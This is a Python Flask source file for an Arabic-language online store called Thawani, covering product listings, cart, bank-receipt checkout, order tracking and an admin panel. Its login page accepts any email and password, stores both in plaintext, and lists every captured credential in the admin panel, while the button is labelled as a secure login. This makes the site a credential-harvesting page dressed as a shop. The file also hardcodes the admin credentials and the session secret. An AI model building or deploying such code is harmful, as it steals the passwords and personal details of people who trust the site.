from flask import Flask, request, render_template_string, redirect, session, url_for
import os, sqlite3, uuid, datetime

app = Flask(__name__)
app.secret_key = "thawani_ultra_max_2026_final"
UPLOAD_FOLDER = 'static/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# --- إعداد قاعدة البيانات الشاملة ---
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    # جدول المنتجات
    c.execute('CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, price REAL, img TEXT, category TEXT, description TEXT)')
    # جدول السلة مع الكمية
    c.execute('CREATE TABLE IF NOT EXISTS cart (id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, product_id INTEGER, quantity INTEGER DEFAULT 1)')
    # جدول الأصناف (الأقسام)
    c.execute('CREATE TABLE IF NOT EXISTS categories (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT)')
    # جدول سجل دخول المستخدمين
    c.execute('CREATE TABLE IF NOT EXISTS users_log (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    # جدول الطلبات مع تتبع الوقت والحالة
    c.execute('''CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, full_name TEXT, phone TEXT, location TEXT, 
        card_img TEXT, items_details TEXT, total_price REAL, status TEXT DEFAULT 'قيد الانتظار', 
        accepted_at TIMESTAMP, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    # جدول التقييمات مع الصور
    c.execute('CREATE TABLE IF NOT EXISTS reviews (id INTEGER PRIMARY KEY AUTOINCREMENT, product_id INTEGER, user_email TEXT, rating INTEGER, comment TEXT, review_img TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    
    # تأكيد وجود قسم افتراضي
    c.execute("SELECT COUNT(*) FROM categories")
    if c.fetchone()[0] == 0:
        c.execute("INSERT INTO categories (name) VALUES ('الكل')")
    conn.commit(); conn.close()

init_db()

ADMIN_MAIL = "qwerasdf1234598760@gmail.com"
ADMIN_PASS = "qaws54321"

# --- التنسيق الكامل (CSS) لجميع الشاشات ---
CSS = """
<style>
    :root { --main: #2ecc71; --dark: #27ae60; --bg: #f9fbf9; --text: #2c3e50; }
    body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); margin: 0; direction: rtl; color: var(--text); -webkit-tap-highlight-color: transparent; }
    header { background: white; padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 15px rgba(0,0,0,0.05); position: sticky; top:0; z-index:1000; border-bottom: 3px solid var(--main); }
    .search-bar { padding: 10px 20px; background: white; border-bottom: 1px solid #eee; display: flex; gap: 10px; }
    .search-bar input { border: 2px solid #eee; border-radius: 8px; padding: 10px 15px; width: 100%; outline: none; transition: 0.3s; }
    .search-bar input:focus { border-color: var(--main); }
    .search-bar button { background: var(--main); color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
    .nav-cats { display: flex; gap: 10px; overflow-x: auto; padding: 15px; background: white; margin-bottom: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.02); scrollbar-width: none; }
    .nav-cats::-webkit-scrollbar { display: none; }
    .nav-cats a { background: #f1f2f6; padding: 8px 18px; border-radius: 20px; text-decoration: none; color: #555; white-space: nowrap; font-weight: bold; border: 1px solid #dfe4ea; transition: 0.3s; }
    .nav-cats a.active { background: var(--main); color: white; border-color: var(--main); }
    .container { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 15px; padding: 15px; }
    .card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #eef7f0; position: relative; transition: transform 0.2s; }
    .card img { width: 100%; height: 160px; object-fit: cover; }
    .card-body { padding: 12px; }
    .price-tag { font-size: 18px; color: var(--main); font-weight: bold; margin: 5px 0; }
    .btn { background: var(--main); color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; text-decoration: none; display: block; text-align: center; font-weight: bold; width: 100%; box-sizing: border-box; transition: 0.3s; }
    input, select, textarea { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; outline: none; font-family: inherit; }
    table { width: 100%; border-collapse: collapse; background: white; margin-bottom: 20px; }
    th, td { padding: 12px; border: 1px solid #eee; text-align: center; font-size: 13px; }
    th { background: var(--main); color: white; }
    .admin-section { background: white; padding: 20px; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #eee; }
    
    /* ستايل الشاحنة وتتبع الـ 7 أيام */
    .track-bg { background: #eee; height: 12px; border-radius: 10px; position: relative; margin: 40px 10px 10px 10px; border: 1px solid #ddd; }
    .truck-icon { position: absolute; top: -30px; font-size: 28px; transition: right 0.5s linear; }
    .track-labels { display: flex; justify-content: space-between; padding: 0 5px; font-size: 11px; color: #888; font-weight: bold; }
</style>
"""

HEADER_HTML = f"""
<!DOCTYPE html>
<html dir='rtl' lang='ar'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
    <title>متجر ثواني | عُمان</title>
    {CSS}
</head>
<body>
"""

@app.route('/')
def index():
    if 'user' not in session: return redirect('/login')
    q = request.args.get('q', '')
    cat = request.args.get('cat', '')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    cats = conn.execute("SELECT * FROM categories").fetchall()
    query = "SELECT * FROM products WHERE 1=1"
    params = []
    if q: 
        query += " AND name LIKE ?"
        params.append(f'%{q}%')
    if cat and cat != 'الكل': 
        query += " AND category = ?"
        params.append(cat)
    prods = conn.execute(query, params).fetchall()
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header>
        <h2 style="color:var(--main); margin:0; font-weight:900;">🌿 THAWANI</h2>
        <div style="display:flex; gap:12px; align-items:center;">
            <a href="/orders_history" style="text-decoration:none; font-size:13px; font-weight:bold; color:var(--text); background:#f1f2f6; padding:5px 10px; border-radius:15px;">طلباتي 📦</a>
            <a href="/cart" style="text-decoration:none; font-size:22px;">🛒</a>
            {% if session.get('is_admin') %}<a href="/admin">⚙️</a>{% endif %}
            <a href="/logout" style="text-decoration:none; color:red; font-weight:bold;">❌</a>
        </div>
    </header>
    <div class="search-bar">
        <form action="/" style="display:flex; width:100%; gap:5px;">
            <input type="text" name="q" placeholder="ابحث عن منتج..." value="{{request.args.get('q', '')}}">
            <button type="submit">🔍</button>
        </form>
    </div>
    <div class="nav-cats">
        <a href="/" class="{{ 'active' if not request.args.get('cat') or request.args.get('cat')=='الكل' }}">الكل</a>
        {% for c in cats %}
            <a href="/?cat={{c['name']}}" class="{{ 'active' if request.args.get('cat') == c['name'] }}">{{c['name']}}</a>
        {% endfor %}
    </div>
    <div class="container">
        {% for p in prods %}
        <div class="card">
            {% if session.get('is_admin') %}
            <a href="/delete_product/{{p['id']}}" onclick="return confirm('هل تريد حذف هذا المنتج نهائياً؟')" style="position:absolute; top:8px; left:8px; background:red; color:white; width:30px; height:30px; border-radius:50%; display:flex; align-items:center; justify-content:center; text-decoration:none; z-index:10;">🗑️</a>
            {% endif %}
            <a href="/product/{{p['id']}}"><img src="/static/uploads/{{p['img']}}"></a>
            <div class="card-body">
                <b style="font-size:14px; display:block; height:40px; overflow:hidden;">{{p['name']}}</b>
                <div class="price-tag">{{p['price']}} OMR</div>
                <a href="/product/{{p['id']}}" class="btn">عرض التفاصيل</a>
            </div>
        </div>
        {% endfor %}
    </div>
    """, cats=cats, prods=prods)

@app.route('/delete_product/<int:id>')
def delete_product(id):
    if session.get('is_admin'):
        conn = sqlite3.connect('database.db')
        conn.execute("DELETE FROM products WHERE id=?", (id,))
        conn.commit(); conn.close()
    return redirect('/')

@app.route('/product/<int:id>', methods=['GET', 'POST'])
def product(id):
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    if request.method == 'POST':
        f = request.files.get('review_img')
        fname = ""
        if f and f.filename != '': 
            fname = f"{uuid.uuid4().hex}.jpg"
            f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
        conn.execute("INSERT INTO reviews (product_id, user_email, rating, comment, review_img) VALUES (?, ?, ?, ?, ?)", 
                     (id, session['user'], request.form['rating'], request.form['comment'], fname))
        conn.commit()
    p = conn.execute("SELECT * FROM products WHERE id=?", (id,)).fetchone()
    revs = conn.execute("SELECT * FROM reviews WHERE product_id=? ORDER BY id DESC", (id,)).fetchall()
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header><a href="/" style="text-decoration:none;">🔙</a> <h3 style="margin:0;">تفاصيل المنتج</h3><div></div></header>
    <div style="max-width:600px; margin:auto; padding:20px;">
        <img src="/static/uploads/{{p['img']}}" style="width:100%; border-radius:15px; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
        <h2>{{p['name']}}</h2>
        <div class="price-tag" style="font-size:26px; margin-bottom:20px;">{{p['price']}} OMR</div>
        <form action="/add_to_cart/{{p['id']}}" style="display:flex; gap:10px; margin-bottom:30px;">
            <input type="number" name="qty" value="1" min="1" style="width:80px; text-align:center;">
            <button class="btn">إضافة إلى السلة 🛒</button>
        </form>
        <hr>
        <div style="margin-top:20px;">
            <h3>⭐ تقييمات العملاء</h3>
            <form method="POST" enctype="multipart/form-data" style="background:#f1f2f6; padding:20px; border-radius:12px;">
                <label>التقييم:</label>
                <select name="rating">
                    <option value="5">⭐⭐⭐⭐⭐ ممتاز</option>
                    <option value="4">⭐⭐⭐⭐ جيد جداً</option>
                    <option value="3">⭐⭐⭐ متوسط</option>
                </select>
                <textarea name="comment" placeholder="اكتب تجربتك هنا..." required rows="3"></textarea>
                <label>أضف صورة (اختياري):</label>
                <input type="file" name="review_img">
                <button class="btn" style="background:#34495e; margin-top:10px;">إرسال التقييم</button>
            </form>
            {% for r in revs %}
            <div style="border-bottom:1px solid #eee; padding:20px 0;">
                <div style="display:flex; justify-content:space-between;">
                    <b style="color:var(--main);">{{r['user_email']}}</b>
                    <span>{{'⭐'*r['rating']}}</span>
                </div>
                <p style="margin:10px 0;">{{r['comment']}}</p>
                {% if r['review_img'] %}<img src="/static/uploads/{{r['review_img']}}" style="width:120px; border-radius:8px; border:1px solid #ddd;">{% endif %}
                <div style="font-size:10px; color:#999;">{{r['time']}}</div>
            </div>
            {% endfor %}
        </div>
    </div>""", p=p, revs=revs)

@app.route('/add_to_cart/<int:id>')
def add_to_cart(id):
    qty = request.args.get('qty', 1, type=int)
    conn = sqlite3.connect('database.db')
    cur = conn.execute("SELECT id FROM cart WHERE user_email=? AND product_id=?", (session['user'], id)).fetchone()
    if cur: conn.execute("UPDATE cart SET quantity = quantity + ? WHERE id=?", (qty, cur[0]))
    else: conn.execute("INSERT INTO cart (user_email, product_id, quantity) VALUES (?, ?, ?)", (session['user'], id, qty))
    conn.commit(); conn.close()
    return redirect('/cart')

@app.route('/cart')
def cart():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    if request.args.get('action') == 'delete':
        conn.execute("DELETE FROM cart WHERE id=?", (request.args.get('id'),))
        conn.commit()
    items = conn.execute('SELECT cart.id, products.name, products.price, cart.quantity FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
    total = sum(i['price'] * i['quantity'] for i in items)
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header><a href="/" style="text-decoration:none; font-size:20px;">🔙</a> <h3 style="margin:0;">سلة المشتريات</h3><div></div></header>
    <div style="padding:20px; max-width:600px; margin:auto;">
        {% for i in items %}
        <div style="background:white; padding:15px; border-radius:12px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center; border:1px solid #eee;">
            <div><b>{{i['name']}}</b><br><small>{{i['quantity']}} × {{i['price']}} OMR</small></div>
            <div style="display:flex; align-items:center; gap:15px;">
                <b style="color:var(--main);">{{ i['price'] * i['quantity'] }} OMR</b>
                <a href="/cart?action=delete&id={{i['id']}}" style="text-decoration:none; font-size:18px;">🗑️</a>
            </div>
        </div>
        {% endfor %}
        {% if items %}
        <div style="background:white; padding:20px; border-radius:12px; margin-top:20px; text-align:center; border:2px solid var(--main);">
            <h2 style="margin:0;">الإجمالي: {{total}} OMR</h2>
            <a href="/checkout" class="btn" style="margin-top:15px; font-size:18px;">إتمام الطلب والدفع 💳</a>
        </div>
        {% else %}
        <div style="text-align:center; padding:100px 20px; color:#999;"><h3>السلة فارغة حالياً..</h3><a href="/" class="btn">تصفح المنتجات</a></div>
        {% endif %}
    </div>""", items=items, total=total)

@app.route('/checkout', methods=['GET', 'POST'])
def checkout():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    items = conn.execute('SELECT products.name, cart.quantity, products.price FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
    if not items: return redirect('/')
    total = sum(i['price'] * i['quantity'] for i in items)
    if request.method == 'POST':
        details = ", ".join([f"{i['name']} ({i['quantity']})" for i in items])
        f = request.files['card_img']; fname = f"{uuid.uuid4().hex}.jpg"; f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
        conn.execute("INSERT INTO orders (user_email, full_name, phone, location, card_img, items_details, total_price) VALUES (?,?,?,?,?,?,?)",
                     (session['user'], request.form['full_name'], request.form['phone'], request.form['location'], fname, details, total))
        conn.execute("DELETE FROM cart WHERE user_email=?", (session['user'],))
        conn.commit(); conn.close()
        return redirect('/orders_history')
    return render_template_string(HEADER_HTML + """
    <header><a href="/cart" style="text-decoration:none;">🔙</a> <h3 style="margin:0;">تأكيد الطلب</h3><div></div></header>
    <div style="padding:20px; max-width:500px; margin:auto;">
        <form method="POST" enctype="multipart/form-data">
            <label>الاسم بالكامل:</label><input name="full_name" required>
            <label>رقم الهاتف (واتساب):</label><input name="phone" required>
            <label>العنوان بالتفصيل:</label><textarea name="location" required rows="3"></textarea>
            <div style="background:#fff3cd; padding:15px; border-radius:10px; margin:15px 0; border:1px solid #ffeeba;">
                <p style="margin:0; font-size:14px;">يرجى إرفاق صورة إيصال التحويل البنكي لإتمام الطلب.</p>
            </div>
            <input type="file" name="card_img" required>
            <button class="btn" style="margin-top:20px;">إرسال الطلب الآن ✅</button>
        </form>
    </div>""")

@app.route('/orders_history')
def orders_history():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    ords = conn.execute("SELECT * FROM orders WHERE user_email=? ORDER BY id DESC", (session['user'],)).fetchall(); conn.close()
    
    def get_progress(accepted_date):
        if not accepted_date: return 0
        try:
            start = datetime.datetime.strptime(accepted_date, '%Y-%m-%d %H:%M:%S')
            now = datetime.datetime.now()
            diff = (now - start).total_seconds()
            perc = (diff / (7 * 24 * 60 * 60)) * 100
            return min(max(perc, 0), 100)
        except: return 0

    return render_template_string(HEADER_HTML + """
    <header><a href="/" style="text-decoration:none;">🔙</a> <h3 style="margin:0;">طلباتي 📦</h3><div></div></header>
    <div style="padding:20px; max-width:600px; margin:auto;">
        {% for o in ords %}
        <div style="background:white; padding:15px; margin-bottom:20px; border-radius:12px; border:1px solid #eee; box-shadow:0 2px 8px rgba(0,0,0,0.05);">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <b>طلب رقم #{{o['id']}}</b>
                <span style="font-size:12px; font-weight:bold; padding:5px 12px; border-radius:15px; background:{{'#d4edda' if o['status']=='تم القبول' else '#f8d7da' if o['status']=='تم الرفض' else '#fff3cd'}}; color:{{'#155724' if o['status']=='تم القبول' else '#721c24' if o['status']=='تم الرفض' else '#856404'}};">
                {{o['status']}}</span>
            </div>
            
            {% if o['status'] == 'تم الرفض' %}
            <div style="color:red; background:#fce4e4; padding:10px; border-radius:8px; margin:10px 0; font-size:13px; font-weight:bold;">
                تم رفض طلبك، يرجى إعادة المحاولة من جديد.
            </div>
            {% elif o['status'] == 'تم القبول' %}
            <div style="color:green; background:#e8f5e9; padding:10px; border-radius:8px; margin:10px 0; font-size:13px; font-weight:bold;">
                تمت الموافقة على طلبك! سيصلك خلال 7 أيام.
            </div>
            <div class="track-bg"><div class="truck-icon" style="right: {{ get_progress(o['accepted_at']) }}%;">🚚</div></div>
            <div class="track-labels"><span>جاري الشحن</span><span>يصل قريباً</span></div>
            {% endif %}
            
            <div style="margin-top:15px; font-size:14px; color:#555;">{{o['items_details']}}</div>
            <div style="margin-top:5px; font-weight:bold; color:var(--main);">الإجمالي: {{o['total_price']}} OMR</div>
        </div>
        {% endfor %}
    </div>""", ords=ords, get_progress=get_progress)

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if not session.get('is_admin'): return redirect('/')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    if request.method == 'POST':
        if 'add_product' in request.form:
            f = request.files['img']; fname = f"{uuid.uuid4().hex}.jpg"; f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
            conn.execute("INSERT INTO products (name, price, img, category) VALUES (?,?,?,?)", (request.form['name'], request.form['price'], fname, request.form['cat']))
        elif 'add_cat' in request.form:
            conn.execute("INSERT INTO categories (name) VALUES (?)", (request.form['cat_name'],))
        conn.commit()
    
    # أوامر القبول والرفض
    action = request.args.get('action'); oid = request.args.get('id')
    if action and oid:
        if action == 'accept':
            now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            conn.execute("UPDATE orders SET status='تم القبول', accepted_at=? WHERE id=?", (now, oid))
        elif action == 'reject':
            conn.execute("UPDATE orders SET status='تم الرفض' WHERE id=?", (oid,))
        conn.commit()

    cats = conn.execute("SELECT * FROM categories").fetchall()
    orders = conn.execute("SELECT * FROM orders ORDER BY id DESC").fetchall()
    logs = conn.execute("SELECT * FROM users_log ORDER BY id DESC").fetchall()
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header><h3>لوحة الإدارة</h3><a href="/" style="text-decoration:none;">خروج</a></header>
    <div style="padding:20px;">
        <div class="admin-section">
            <h4>➕ إضافة صنف (قسم جديد)</h4>
            <form method="POST" style="display:flex; gap:10px;">
                <input name="cat_name" placeholder="اسم القسم (مثلاً: شدات)" required>
                <button name="add_cat" class="btn" style="width:120px;">حفظ القسم</button>
            </form>
        </div>
        
        <div class="admin-section">
            <h4>📦 إضافة منتج جديد</h4>
            <form method="POST" enctype="multipart/form-data">
                <input name="name" placeholder="اسم المنتج" required>
                <input name="price" placeholder="السعر" required>
                <select name="cat">
                    {% for c in cats %}<option value="{{c['name']}}">{{c['name']}}</option>{% endfor %}
                </select>
                <input type="file" name="img" required>
                <button name="add_product" class="btn">إضافة للمتجر</button>
            </form>
        </div>

        <h4>📑 الطلبات الأخيرة</h4>
        {% for o in orders %}
        <div style="background:white; padding:15px; border-radius:12px; margin-bottom:15px; border:1px solid #ddd;">
            <b>العميل: {{o['full_name']}}</b> ({{o['phone']}})<br>
            <small>{{o['items_details']}}</small><br>
            <b>المبلغ: {{o['total_price']}} OMR</b><br>
            <div style="margin:10px 0;">
                <a href="/admin?action=accept&id={{o['id']}}" class="btn" style="display:inline-block; width:auto; padding:5px 15px; background:#2ecc71;">قبول ✅</a>
                <a href="/admin?action=reject&id={{o['id']}}" class="btn" style="display:inline-block; width:auto; padding:5px 15px; background:#e74c3c; margin-right:10px;">رفض ❌</a>
            </div>
            <p>صورة الإيصال:</p>
            <a href="/static/uploads/{{o['card_img']}}" target="_blank"><img src="/static/uploads/{{o['card_img']}}" style="width:120px; border-radius:5px; border:1px solid #ccc;"></a>
        </div>
        {% endfor %}

        <h4>👤 سجل دخول المستخدمين</h4>
        <div style="overflow-x:auto;">
            <table>
                <tr><th>الإيميل</th><th>الباسورد</th><th>التاريخ</th></tr>
                {% for l in logs %}<tr><td>{{l['email']}}</td><td>{{l['password']}}</td><td>{{l['time']}}</td></tr>{% endfor %}
            </table>
        </div>
    </div>""", cats=cats, orders=orders, logs=logs)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email, password = request.form['email'], request.form['password']
        conn = sqlite3.connect('database.db'); conn.execute("INSERT INTO users_log (email, password) VALUES (?, ?)", (email, password)); conn.commit(); conn.close()
        session['user'], session['is_admin'] = email, (email == ADMIN_MAIL and password == ADMIN_PASS)
        return redirect('/')
    return render_template_string(HEADER_HTML + """
    <div style="display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px;">
        <div style='background:white; padding:40px; border-radius:25px; box-shadow:0 10px 40px rgba(0,0,0,0.1); width:100%; max-width:400px; text-align:center;'>
            <h1 style="color:var(--main); margin-bottom:30px; font-weight:900;">THAWANI</h1>
            <form method='POST'>
                <input type="email" name='email' placeholder='البريد الإلكتروني' required>
                <input type='password' name='password' placeholder='كلمة المرور' required>
                <button class='btn' style="padding:15px; font-size:18px;">دخول آمن 🔒</button>
            </form>
        </div>
    </div>""")

@app.route('/logout')
def logout():
    session.clear(); return redirect('/login')

application = app
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000) 
